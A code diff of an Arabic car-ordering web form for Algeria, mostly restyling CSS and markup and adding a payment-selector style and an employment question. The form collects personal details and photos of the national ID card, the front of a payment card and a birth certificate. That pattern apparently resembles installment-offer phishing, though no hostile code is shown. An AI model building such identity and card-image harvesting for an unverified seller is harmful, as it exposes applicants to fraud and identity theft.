@@ -1,656 +1,1347 @@
 <!DOCTYPE html>
 
 <html dir="rtl" lang="ar">
+
 <head>
-<meta charset="utf-8"/>
-<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<title>طلب السيارة </title>
-<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css" rel="stylesheet"/>
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" rel="stylesheet"/>
-<style>
-    :root{
-      --brand:#8B0000;          /* أحمر كلاسيك */
-      --brand2:#B22222;         /* FireBrick */
-      --accent:#4BB543;         /* أخضر نجاح */
-      --muted:#6c757d;
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+  <title>طلب السيارة </title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css" rel="stylesheet" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" rel="stylesheet" />
+  <style>
+    :root {
+      --brand: #8B0000;
+      /* أحمر كلاسيك */
+      --brand2: #B22222;
+      /* FireBrick */
+      --accent: #4BB543;
+      /* أخضر نجاح */
+      --muted: #6c757d;
     }
-    body{
-      background:#f2f2f2;
-      font-family:'Tahoma', system-ui, sans-serif;
-      color:#1f2937;
-      padding:28px 10px;
+
+    body {
+      background: #f2f2f2;
+      font-family: 'Tahoma', system-ui, sans-serif;
+      color: #1f2937;
+      padding: 28px 10px;
     }
-    .app-card{
-      max-width:880px;margin:0 auto;background:#fff;border-radius:14px;
-      box-shadow:0 14px 45px rgba(0,0,0,.12); overflow:hidden;
-      animation:fadeIn .5s ease both;
+
+    .app-card {
+      max-width: 880px;
+      margin: 0 auto;
+      background: #fff;
+      border-radius: 14px;
+      box-shadow: 0 14px 45px rgba(0, 0, 0, .12);
+      overflow: hidden;
+      animation: fadeIn .5s ease both;
     }
-    @keyframes fadeIn{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
-    .header{
-      background:linear-gradient(135deg,var(--brand),var(--brand2));
-      color:#fff;padding:18px 22px;
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(18px)
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0)
+      }
     }
-    .header h1{font-size:1.35rem;margin:0;font-weight:800}
-    .content{padding:22px}
-    .form-label i{color:var(--brand);margin-left:6px;}
-    .small-hint{font-size:.85rem;color:#64748b}
-    .btn-brand{
-      background:linear-gradient(135deg,var(--brand),var(--brand2));border:none;color:#fff;font-weight:700;
+
+    .header {
+      background: linear-gradient(135deg, var(--brand), var(--brand2));
+      color: #fff;
+      padding: 18px 22px;
     }
-    .btn-brand:disabled{opacity:.8}
+
+    .header h1 {
+      font-size: 1.35rem;
+      margin: 0;
+      font-weight: 800
+    }
+
+    .content {
+      padding: 22px
+    }
+
+    .form-label i {
+      color: var(--brand);
+      margin-left: 6px;
+    }
+
+    .small-hint {
+      font-size: .85rem;
+      color: #64748b
+    }
+
+    .btn-brand {
+      background: linear-gradient(135deg, var(--brand), var(--brand2));
+      border: none;
+      color: #fff;
+      font-weight: 700;
+    }
+
+    .btn-brand:disabled {
+      opacity: .8
+    }
+
     /* Dropzone */
-    .dropzone{
-      position:relative;border:2px dashed #d0d5dd;border-radius:12px;background:#fafafa;
-      padding:18px;text-align:center;transition:.25s ease;
+    .dropzone {
+      position: relative;
+      border: 2px dashed #d0d5dd;
+      border-radius: 12px;
+      background: #fafafa;
+      padding: 18px;
+      text-align: center;
+      transition: .25s ease;
     }
-    .dropzone:hover,.dropzone.dragover{border-color:var(--brand);background:#fff5f5}
-    .dropzone .dz-icon{font-size:28px;color:var(--brand)}
-    .preview{display:none;margin-top:10px}
-    .preview img{max-width:100%;border-radius:10px;box-shadow:0 8px 24px rgba(0,0,0,.08)}
-    .preview .meta{font-size:.85rem;color:#475569;margin-top:6px;text-align:center}
-    .preview .actions{display:flex;gap:10px;justify-content:center;margin-top:8px}
-    .camera-btn{margin-top:8px}
+
+    .dropzone:hover,
+    .dropzone.dragover {
+      border-color: var(--brand);
+      background: #fff5f5
+    }
+
+    .dropzone .dz-icon {
+      font-size: 28px;
+      color: var(--brand)
+    }
+
+    .preview {
+      display: none;
+      margin-top: 10px
+    }
+
+    .preview img {
+      max-width: 100%;
+      border-radius: 10px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, .08)
+    }
+
+    .preview .meta {
+      font-size: .85rem;
+      color: #475569;
+      margin-top: 6px;
+      text-align: center
+    }
+
+    .preview .actions {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-top: 8px
+    }
+
+    .camera-btn {
+      margin-top: 8px
+    }
+
     /* Loading on submit */
-    .spinner-small{
-      width:1.1rem;height:1.1rem;border:.15rem solid rgba(255,255,255,.7);border-top-color:transparent;border-radius:50%;
-      display:inline-block;vertical-align:-2px;animation:spin 1s linear infinite;
+    .spinner-small {
+      width: 1.1rem;
+      height: 1.1rem;
+      border: .15rem solid rgba(255, 255, 255, .7);
+      border-top-color: transparent;
+      border-radius: 50%;
+      display: inline-block;
+      vertical-align: -2px;
+      animation: spin 1s linear infinite;
     }
-    @keyframes spin{to{transform:rotate(360deg)}}
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg)
+      }
+    }
+
     /* Toast inline */
-    .toast-inline{display:none;border-radius:12px;padding:10px 14px;font-weight:600}
-    .toast-inline.show{display:block}
+    .toast-inline {
+      display: none;
+      border-radius: 12px;
+      padding: 10px 14px;
+      font-weight: 600
+    }
+
+    .toast-inline.show {
+      display: block
+    }
+
     /* Success Modal */
-    .success-modal .modal-content{border:0;border-radius:16px;padding:22px 20px}
-    .success-mark{width:120px;height:120px;margin:0 auto 10px;display:block}
-    .success-text h4{margin:0;color:var(--accent);font-weight:800}
-    .success-text p{margin:6px 0 0}
+    .success-modal .modal-content {
+      border: 0;
+      border-radius: 20px;
+      padding: 0;
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+    }
+
+    .success-header {
+      background: linear-gradient(135deg, #4BB543 0%, #3a9435 100%);
+      padding: 40px 30px 30px;
+      color: white;
+    }
+
+    .success-icon-wrapper {
+      margin-bottom: 20px;
+    }
+
+    .success-mark {
+      width: 100px;
+      height: 100px;
+      margin: 0 auto;
+      display: block;
+      filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.15));
+    }
+
+    .success-title {
+      margin: 15px 0 10px;
+      font-size: 1.75rem;
+      font-weight: 800;
+      color: white;
+    }
+
+    .success-subtitle {
+      margin: 0;
+      font-size: 1rem;
+      color: rgba(255, 255, 255, 0.95);
+      line-height: 1.6;
+    }
+
+    .order-details-card {
+      padding: 30px;
+      background: #f8f9fa;
+    }
+
+    .order-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: var(--brand);
+      margin-bottom: 25px;
+    }
+
+    .order-header i {
+      font-size: 1.4rem;
+    }
+
+    .order-id-section {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+    }
+
+    .order-label {
+      display: block;
+      font-size: 0.9rem;
+      color: #6c757d;
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+
+    .order-id-display {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      font-size: 1.8rem;
+      font-weight: 800;
+      color: var(--brand);
+      font-family: 'Courier New', monospace;
+    }
+
+    .copy-btn {
+      background: #e9ecef;
+      border: none;
+      padding: 8px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      color: #495057;
+    }
+
+    .copy-btn:hover {
+      background: var(--brand);
+      color: white;
+      transform: scale(1.05);
+    }
+
+    .barcode-section {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+    }
+
+    .barcode-section canvas {
+      display: block;
+      margin: 0 auto;
+      border: 2px solid #e5e7eb;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+    }
+
+    .save-instructions {
+      display: grid;
+      gap: 12px;
+    }
+
+    .instruction-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: white;
+      padding: 12px 16px;
+      border-radius: 10px;
+      font-weight: 600;
+      color: #495057;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
+      transition: transform 0.2s ease;
+    }
+
+    .instruction-item:hover {
+      transform: translateX(-5px);
+    }
+
+    .instruction-item i {
+      font-size: 1.3rem;
+    }
+
+    .modal-footer-custom {
+      padding: 20px 30px 30px;
+      background: white;
+      border-top: 1px solid #e9ecef;
+    }
+
     /* SVG animation */
-    .path-check{stroke-dasharray: 48; stroke-dashoffset: 48; animation: dash 800ms ease forwards 200ms;}
-    .path-circle{transform-origin:50% 50%; animation: popIn 250ms ease forwards;}
-    @keyframes dash{to{stroke-dashoffset: 0;}}
-    @keyframes popIn{from{transform:scale(.8);opacity:.2}to{transform:scale(1);opacity:1}}
-    
+    .path-check {
+      stroke-dasharray: 48;
+      stroke-dashoffset: 48;
+      animation: dash 800ms ease forwards 200ms;
+    }
+
+    .path-circle {
+      transform-origin: 50% 50%;
+      animation: popIn 250ms ease forwards;
+    }
+
+    @keyframes dash {
+      to {
+        stroke-dashoffset: 0;
+      }
+    }
+
+    @keyframes popIn {
+      from {
+        transform: scale(.8);
+        opacity: .2
+      }
+
+      to {
+        transform: scale(1);
+        opacity: 1
+      }
+    }
+
     /* تحسينات إضافية */
     .form-section {
       border-bottom: 1px solid #e5e7eb;
       padding-bottom: 1.5rem;
       margin-bottom: 1.5rem;
     }
+
     .form-section:last-child {
       border-bottom: none;
     }
+
     .section-title {
       color: var(--brand);
       font-weight: 700;
       margin-bottom: 1rem;
       font-size: 1.1rem;
     }
+
     .required-field::after {
       content: " *";
       color: var(--brand);
     }
+
+    /* Payment Method Selector */
+    .payment-method-selector {
+      margin-top: 1rem;
+    }
+
+    .payment-option-wrapper {
+      position: relative;
+      display: inline-block;
+    }
+
+    .payment-option-simple {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      padding: 8px 12px;
+      border-radius: 8px;
+      transition: all 0.2s ease;
+    }
+
+    .payment-option-simple:hover {
+      background: #f9f9f9;
+    }
+
+    .radio-circle {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #d0d5dd;
+      border-radius: 50%;
+      display: inline-block;
+      position: relative;
+      transition: all 0.2s ease;
+    }
+
+    .btn-check:checked+.payment-option-simple .radio-circle {
+      border-color: var(--brand);
+      border-width: 6px;
+    }
+
+    .payment-logo-simple {
+      width: 50px;
+      height: 40px;
+      object-fit: contain;
+    }
+
+    .question-mark {
+      font-size: 18px;
+      color: #9ca3af;
+      font-weight: 600;
+    }
   </style>
 </head>
+
 <body>
-<div class="app-card">
-<div class="header d-flex align-items-center justify-content-between">
-<h1><i class="fa fa-car me-2"></i> طلب السيارة</h1>
-</div>
-<div class="content">
-<div class="toast-inline alert" id="toast" role="alert"></div>
-<form class="needs-validation" id="carForm" novalidate="">
-<!-- قسم المعلومات الشخصية -->
-<div class="form-section">
-<h3 class="section-title"><i class="fa fa-user me-2"></i>المعلومات الشخصية</h3>
-<div class="row g-3">
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-user"></i> الاسم</label>
-<input class="form-control" name="firstName" required="" type="text"/>
-<div class="form-text small-hint">يرجى إدخال الاسم كما هو مدون في وثيقة الهوية</div>
-</div>
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-user"></i> اللقب</label>
-<input class="form-control" name="lastName" required="" type="text"/>
-</div>
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-hourglass-half"></i> العمر</label>
-<input class="form-control" max="100" min="18" name="age" required="" type="number"/>
-<div class="form-text small-hint">يجب أن يكون عمر المتقدم 18 سنة أو أكثر</div>
-</div>
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-city"></i> مكان الازدياد</label>
-<input class="form-control" name="birthPlace" required="" type="text"/>
-</div>
-</div>
-</div>
-<!-- قسم معلومات الاتصال والعنوان -->
-<div class="form-section">
-<h3 class="section-title"><i class="fa fa-address-card me-2"></i>معلومات الاتصال والعنوان</h3>
-<div class="row g-3">
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-phone"></i> رقم الهاتف</label>
-<input class="form-control" maxlength="10" name="phone" placeholder="0XXXXXXXXX" required="" type="tel"/>
-<div class="form-text small-hint">يجب أن يبدأ الرقم بـ 05 أو 06 أو 07 ويتكون من 10 أرقام</div>
-</div>
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-map-location-dot"></i> الولاية</label>
-<select class="form-select" name="state" required=""><option disabled="True" selected="True" value="">اختر ولايتك</option><option value="أدرار">أدرار</option><option value="الشلف">الشلف</option><option value="الأغواط">الأغواط</option><option value="أم البواقي">أم البواقي</option><option value="باتنة">باتنة</option><option value="بجاية">بجاية</option><option value="بسكرة">بسكرة</option><option value="بشار">بشار</option><option value="البليدة">البليدة</option><option value="البويرة">البويرة</option><option value="تمنراست">تمنراست</option><option value="تبسة">تبسة</option><option value="تلمسان">تلمسان</option><option value="تيارت">تيارت</option><option value="تيزي وزو">تيزي وزو</option><option value="الجزائر">الجزائر</option><option value="الجلفة">الجلفة</option><option value="جيجل">جيجل</option><option value="سطيف">سطيف</option><option value="سعيدة">سعيدة</option><option value="سكيكدة">سكيكدة</option><option value="سيدي بلعباس">سيدي بلعباس</option><option value="عنابة">عنابة</option><option value="قالمة">قالمة</option><option value="قسنطينة">قسنطينة</option><option value="المدية">المدية</option><option value="مستغانم">مستغانم</option><option value="المسيلة">المسيلة</option><option value="معسكر">معسكر</option><option value="ورقلة">ورقلة</option><option value="وهران">وهران</option><option value="البيض">البيض</option><option value="إليزي">إليزي</option><option value="برج بوعريريج">برج بوعريريج</option><option value="بومرداس">بومرداس</option><option value="الطارف">الطارف</option><option value="تندوف">تندوف</option><option value="تيسمسيلت">تيسمسيلت</option><option value="الوادي">الوادي</option><option value="خنشلة">خنشلة</option><option value="سوق أهراس">سوق أهراس</option><option value="تيبازة">تيبازة</option><option value="ميلة">ميلة</option><option value="عين الدفلى">عين الدفلى</option><option value="النعامة">النعامة</option><option value="عين تموشنت">عين تموشنت</option><option value="غرداية">غرداية</option><option value="غليزان">غليزان</option><option value="تيميمون">تيميمون</option><option value="برج باجي مختار">برج باجي مختار</option><option value="بني عباس">بني عباس</option><option value="أولاد جلال">أولاد جلال</option><option value="إن صالح">إن صالح</option><option value="إن قزام">إن قزام</option><option value="توقرت">توقرت</option><option value="جانت">جانت</option><option value="المغير">المغير</option><option value="المنيعة">المنيعة</option></select>
-</div>
-<div class="col-12">
-<label class="form-label required-field"><i class="fa fa-location-dot"></i> العنوان بالضبط</label>
-<textarea class="form-control" name="address" required="" rows="2"></textarea>
-<div class="form-text small-hint">يرجى كتابة العنوان بالتفصيل لتسهيل عملية التواصل والتوصيل</div>
-</div>
-</div>
-</div>
-<!-- قسم معلومات الدفع -->
-<div class="form-section">
-<h3 class="section-title"><i class="fa fa-car me-2"></i>معلومات السيارة</h3>
-<div class="row g-3">
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-car"></i> نوع السيارة</label>
-<select class="form-select" name="carType" required="">
-<option disabled="" selected="" value="">اختر نوع السيارة</option>
-<option value="Chery Tiggo 2 Pro">Chery Tiggo 2 Pro</option>
-<option value="Chery Tiggo 4 Pro">Chery Tiggo 4 Pro</option>
-<option value="Chery Tiggo 7 Pro">Chery Tiggo 7 Pro</option>
-<option value="Chery Tiggo 8 Pro">Chery Tiggo 8 Pro</option>
-<option value="Arizzo 5">Arizzo 5</option>
-<option value="Arizzo 8">Arizzo 8</option>
-<option value="Geely GX3 PRO">Geely GX3 PRO</option>
-</select>
-</div>
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-palette"></i> لون السيارة</label>
-<select class="form-select" name="carColor" required="">
-<option disabled="" selected="" value="">اختر اللون</option>
-<option value="أبيض">أبيض</option>
-<option value="أزرق نيلي">أزرق نيلي</option>
-<option value="أزرق">أزرق</option>
-<option value="رمادي">رمادي</option>
-<option value="برونزي">برونزي</option>
-<option value="أسود">أسود</option>
-</select>
-</div>
-</div>
-</div>
-<div class="form-section">
-<h3 class="section-title"><i class="fa fa-credit-card me-2"></i>معلومات الدفع</h3>
-<div class="row g-3">
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-money-bill-wave"></i> طريقة الدفع</label>
-<div class="d-flex gap-3">
-<div class="form-check">
-<input class="form-check-input" id="cash" name="paymentType" required="" type="radio" value="كاش"/>
-<label class="form-check-label" for="cash">كاش</label>
-</div>
-<div class="form-check">
-<input class="form-check-input" id="installment" name="paymentType" required="" type="radio" value="بالتقسيط"/>
-<label class="form-check-label" for="installment">بالتقسيط</label>
-</div>
-</div>
-</div>
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-circle-question"></i> هل قمت بالاستفادة من خدمة التقسيط من قبل؟</label>
-<div class="d-flex gap-3">
-<div class="form-check">
-<input class="form-check-input" id="usedYes" name="usedInstallment" required="" type="radio" value="نعم"/>
-<label class="form-check-label" for="usedYes">نعم</label>
-</div>
-<div class="form-check">
-<input class="form-check-input" id="usedNo" name="usedInstallment" required="" type="radio" value="لا"/>
-<label class="form-check-label" for="usedNo">لا</label>
-</div>
-</div>
-</div>
-</div>
-</div>
-<!-- قسم المستندات المطلوبة -->
-<div class="form-section">
-<h3 class="section-title"><i class="fa fa-file-contract me-2"></i>المستندات المطلوبة</h3>
-<div class="row g-3">
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-id-card"></i> صورة بطاقة التعريف الوطنية</label>
-<div class="dropzone" id="dz-id">
-<div class="dz-icon"><i class="fa fa-cloud-arrow-up"></i></div>
-<div class="dz-invite small-hint">اسحب وأفلت الصورة هنا أو اضغط للاختيار — (PNG, JPG, WEBP ≤ 6MB)</div>
-<input accept="image/jpeg,image/png,image/webp" class="d-none" id="input-id" type="file"/>
-</div>
-<div class="d-grid camera-btn">
-<button class="btn btn-outline-secondary" id="btn-camera-id" type="button"><i class="fa fa-camera"></i> تصوير بالكاميرا</button>
-</div>
-<input accept="image/*" capture="environment" class="d-none" id="camera-id" type="file"/>
-<div class="preview" id="prev-id">
-<img alt="معاينة بطاقة التعريف" id="img-id"/>
-<div class="meta" id="meta-id"></div>
-<div class="actions">
-<button class="btn btn-sm btn-outline-secondary" id="change-id" type="button"><i class="fa fa-rotate"></i> تغيير</button>
-<button class="btn btn-sm btn-outline-danger" id="remove-id" type="button"><i class="fa fa-trash"></i> حذف</button>
-</div>
-</div>
-<div class="form-text small-hint">يجب أن تكون صورة واضحة وبجميع التفاصيل مرئية</div>
-</div>
-<div class="col-md-6">
-<label class="form-label required-field"><i class="fa fa-credit-card"></i> الواجهة الامامية للبطاقة الذهبية</label>
-<div class="dropzone" id="dz-gold">
-<div class="dz-icon"><i class="fa fa-cloud-arrow-up"></i></div>
-<div class="dz-invite small-hint">اسحب وأفلت الصورة هنا أو اضغط للاختيار — (PNG, JPG, WEBP ≤ 6MB)</div>
-<input accept="image/jpeg,image/png,image/webp" class="d-none" id="input-gold" type="file"/>
-</div>
-<div class="d-grid camera-btn">
-<button class="btn btn-outline-secondary" id="btn-camera-gold" type="button"><i class="fa fa-camera"></i> تصوير بالكاميرا</button>
-</div>
-<input accept="image/*" capture="environment" class="d-none" id="camera-gold" type="file"/>
-<div class="preview" id="prev-gold">
-<img alt="معاينة البطاقة" id="img-gold"/>
-<div class="meta" id="meta-gold"></div>
-<div class="actions">
-<button class="btn btn-sm btn-outline-secondary" id="change-gold" type="button"><i class="fa fa-rotate"></i> تغيير</button>
-<button class="btn btn-sm btn-outline-danger" id="remove-gold" type="button"><i class="fa fa-trash"></i> حذف</button>
-</div>
-</div>
-<div class="form-text small-hint">يجب أن تكون صورة واضحة وبجميع التفاصيل مرئية</div>
-</div>
-</div>
-</div>
-<div class="form-section">
-<h3 class="section-title">
-<i class="fa fa-file-lines me-2"></i>
-        شهادة الميلاد (إن وجدت — <span style="color:red;">اختياري</span>)
-      </h3>
-<div class="row g-3">
-<div class="col-md-6">
-<label class="form-label"><i class="fa fa-id-card"></i> صورة شهادة الميلاد</label>
-<div class="dropzone" id="dz-birth">
-<div class="dz-icon"><i class="fa fa-cloud-arrow-up"></i></div>
-<div class="dz-invite small-hint">اسحب وأفلت الصورة هنا أو اضغط للاختيار — (PNG, JPG, WEBP ≤ 6MB)</div>
-<input accept="image/jpeg,image/png,image/webp" class="d-none" id="input-birth" type="file"/>
-</div>
-<div class="d-grid camera-btn">
-<button class="btn btn-outline-secondary" id="btn-camera-birth" type="button">
-<i class="fa fa-camera"></i> تصوير بالكاميرا
-            </button>
-</div>
-<input accept="image/*" capture="environment" class="d-none" id="camera-birth" type="file"/>
-<div class="preview" id="prev-birth">
-<img alt="معاينة شهادة الميلاد" id="img-birth"/>
-<div class="meta" id="meta-birth"></div>
-<div class="actions">
-<button class="btn btn-sm btn-outline-secondary" id="change-birth" type="button"><i class="fa fa-rotate"></i> تغيير</button>
-<button class="btn btn-sm btn-outline-danger" id="remove-birth" type="button"><i class="fa fa-trash"></i> حذف</button>
-</div>
-</div>
-<div class="form-text small-hint">يُفضل إرفاقها إن وُجدت لتسريع المعالجة</div>
-</div>
-</div>
-</div>
-<div class="d-grid mt-4">
-<button class="btn btn-brand btn-lg" id="submitBtn">
-<span class="btn-text">إرسال الطلب</span>
-<span class="btn-wip d-none"><span class="spinner-small me-2"></span> جارٍ الإرسال…</span>
-</button>
-</div>
-</form>
-</div>
-</div>
-<!-- Success Modal -->
-<div aria-hidden="true" class="modal fade success-modal" id="successModal" tabindex="-1">
-<div class="modal-dialog modal-dialog-centered">
-<div class="modal-content text-center">
-<svg class="success-mark" viewbox="0 0 100 100">
-<circle class="path-circle" cx="50" cy="50" fill="var(--accent)" r="46"></circle>
-<path class="path-check" d="M30 52 L45 67 L72 40" fill="none" stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-width="8"></path>
-</svg>
-<div class="success-text">
-<h4>شكراً</h4>
-<p>✅ سيتم معالجة طلبكم والاتصال بكم عن قريب</p>
-</div>
-<div id="orderInfo" style="margin-top:12px;">
-<p style="margin:0.4rem 0 0.2rem;font-weight:700;">رقم الطلب: <span id="orderId" style="font-size:1.15rem;color:#111;"></span></p>
-<canvas height="80" id="barcodeCanvas" style="display:block;margin:10px auto 0;border:1px solid #eee;border-radius:6px;" width="300"></canvas>
-<p style="font-size:0.85rem;color:#6b7280;margin-top:6px;">(قم بحفظ هاذا الرمز او ضع لقطة شاشة لعدم تضييعه  — شكرا لكم )</p>
-</div>
-</div>
-</div>
-</div>
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-<script>
-document.addEventListener("DOMContentLoaded", function() {
-  const colorSelect = document.querySelector('select[name="carColor"]');
-  const carSelect = document.querySelector('select[name="carType"]');
-  const carColors = {
-    "Chery Tiggo 2 Pro": ["أبيض", "أزرق نيلي"],
-    "Chery Tiggo 4 Pro": ["أبيض", "رمادي", "برونزي"],
-    "Chery Tiggo 7 Pro": ["أسود", "أبيض"],
-    "Chery Tiggo 8 Pro": ["أسود"],
-    "Arizzo 5": ["أزرق", "أسود", "أبيض"],
-    "Arizzo 8": ["أسود", "أبيض"],
-    "Geely GX3 PRO": ["أبيض"]
-  };
-
-  function updateColors() {
-    const selectedCar = carSelect.value;
-    colorSelect.innerHTML = "";
-    const defaultOpt = document.createElement("option");
-    defaultOpt.textContent = "اختر اللون المتاح";
-    defaultOpt.disabled = true;
-    defaultOpt.selected = true;
-    colorSelect.appendChild(defaultOpt);
-
-    if (selectedCar && carColors[selectedCar]) {
-      carColors[selectedCar].forEach(c => {
-        const opt = document.createElement("option");
-        opt.value = c;
-        opt.textContent = c;
-        colorSelect.appendChild(opt);
-      });
-    }
-  }
-
-  carSelect.addEventListener("change", updateColors);
-});
-</script>
-<!-- Loading Modal -->
-<div aria-hidden="true" class="modal fade" id="loadingModal" tabindex="-1">
-<div class="modal-dialog modal-dialog-centered">
-<div class="modal-content text-center p-4">
-<div class="spinner-border text-danger mb-3" role="status" style="width: 3rem; height: 3rem;"></div>
-<h5>جارٍ الإرسال... يرجى الانتظار</h5>
-</div>
-</div>
-</div>
-<!-- Warning Modal -->
-
-<div class="toast-inline alert alert-danger" id="bottomAlert" role="alert" style="position:fixed;bottom:18px;left:50%;transform:translateX(-50%);z-index:2100;display:none;padding:12px 18px;border-radius:10px;font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,.12);">
-  ⚠️ الرجاء ملء جميع الحقول المطلوبة قبل الإرسال.
-</div>
-<script>
-function showBottomAlert(msg){
-  try{
-    const el = document.getElementById('bottomAlert');
-    if(!el) return;
-    el.textContent = msg || '⚠️ الرجاء ملء جميع الحقول المطلوبة قبل الإرسال.';
-    el.style.display = 'block';
-    clearTimeout(window._bottomAlertTimeout);
-    window._bottomAlertTimeout = setTimeout(function(){ el.style.display = 'none'; }, 4000);
-  }catch(e){ console.warn(e); }
-}
-
-document.addEventListener('DOMContentLoaded', function(){
-  const form = document.getElementById('carForm');
-  if(!form) return;
-  const inputs = form.querySelectorAll('input, textarea, select');
-  inputs.forEach(function(i){
-    i.addEventListener('input', function(){ const el = document.getElementById('bottomAlert'); if(el) el.style.display = 'none'; });
-    i.addEventListener('change', function(){ const el = document.getElementById('bottomAlert'); if(el) el.style.display = 'none'; });
-  });
-});
-</script>
-
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-  const MAX_SIZE = 6 * 1024 * 1024;
-  const ALLOWED = ["image/jpeg","image/png","image/webp"];
-
-  function humanSize(bytes){
-    const u = ['B','KB','MB','GB']; let i=0, n=bytes;
-    while(n>=1024 && i<u.length-1){ n/=1024; i++; } return n.toFixed(1)+' '+u[i];
-  }
-  function showBottomAlert(msg){
-    try{
-      const el = document.getElementById('bottomAlert');
-      if(!el) return;
-      el.textContent = msg || '⚠️ الرجاء ملء جميع الحقول المطلوبة قبل الإرسال.';
-      el.style.display = 'block';
-      clearTimeout(window._bottomAlertTimeout);
-      window._bottomAlertTimeout = setTimeout(function(){ el.style.display = 'none'; }, 4000);
-    }catch(e){ console.warn(e); }
-  }
-  function dataURLtoBlob(dataurl){
-    var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-    while(n--){ u8arr[n] = bstr.charCodeAt(n); }
-    return new Blob([u8arr], {type:mime});
-  }
-
-  function initDropzone(key){
-    const dz = document.getElementById('dz-' + key);
-    const input = document.getElementById('input-' + key);
-    const camBtn = document.getElementById('btn-camera-' + key);
-    const camInput = document.getElementById('camera-' + key);
-    const prev = document.getElementById('prev-' + key);
-    const img = document.getElementById('img-' + key);
-    const meta = document.getElementById('meta-' + key);
-    const btnChange = document.getElementById('change-' + key);
-    const btnRemove = document.getElementById('remove-' + key);
-
-    function showPreview(file){
-      if(!file) return;
-      if(!ALLOWED.includes(file.type)){ showBottomAlert('⚠️ نوع ملف غير مدعوم'); return; }
-      if(file.size > MAX_SIZE){ showBottomAlert('⚠️ الحجم كبير: الحد الأقصى 6MB'); return; }
-      const reader = new FileReader();
-      reader.onload = function(e){
-        if(img) img.src = e.target.result;
-        if(meta) meta.textContent = file.name + ' — ' + humanSize(file.size);
-        if(prev) prev.style.display = 'block';
-        if(dz) dz.style.display = 'none';
+  <div class="app-card">
+    <div class="header d-flex align-items-center justify-content-between">
+      <h1><i class="fa fa-car me-2"></i> طلب السيارة</h1>
+    </div>
+    <div class="content">
+      <div class="toast-inline alert" id="toast" role="alert"></div>
+      <form class="needs-validation" id="carForm" novalidate="">
+        <!-- قسم المعلومات الشخصية -->
+        <div class="form-section">
+          <h3 class="section-title"><i class="fa fa-user me-2"></i>المعلومات الشخصية</h3>
+          <div class="row g-3">
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-user"></i> الاسم</label>
+              <input class="form-control" name="firstName" required="" type="text" />
+              <div class="form-text small-hint">يرجى إدخال الاسم كما هو مدون في وثيقة الهوية</div>
+            </div>
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-user"></i> اللقب</label>
+              <input class="form-control" name="lastName" required="" type="text" />
+            </div>
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-hourglass-half"></i> العمر</label>
+              <input class="form-control" max="100" min="18" name="age" required="" type="number" />
+              <div class="form-text small-hint">يجب أن يكون عمر المتقدم 18 سنة أو أكثر</div>
+            </div>
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-city"></i> مكان الازدياد</label>
+              <input class="form-control" name="birthPlace" required="" type="text" />
+            </div>
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-briefcase"></i> هل أنت موظف؟</label>
+              <div class="d-flex gap-3">
+                <div class="form-check">
+                  <input class="form-check-input" id="employedYes" name="isEmployed" required="" type="radio" value="نعم" />
+                  <label class="form-check-label" for="employedYes">نعم</label>
+                </div>
+                <div class="form-check">
+                  <input class="form-check-input" id="employedNo" name="isEmployed" required="" type="radio" value="لا" />
+                  <label class="form-check-label" for="employedNo">لا</label>
+                </div>
+              </div>
+            </div>
+            <div class="col-md-6">
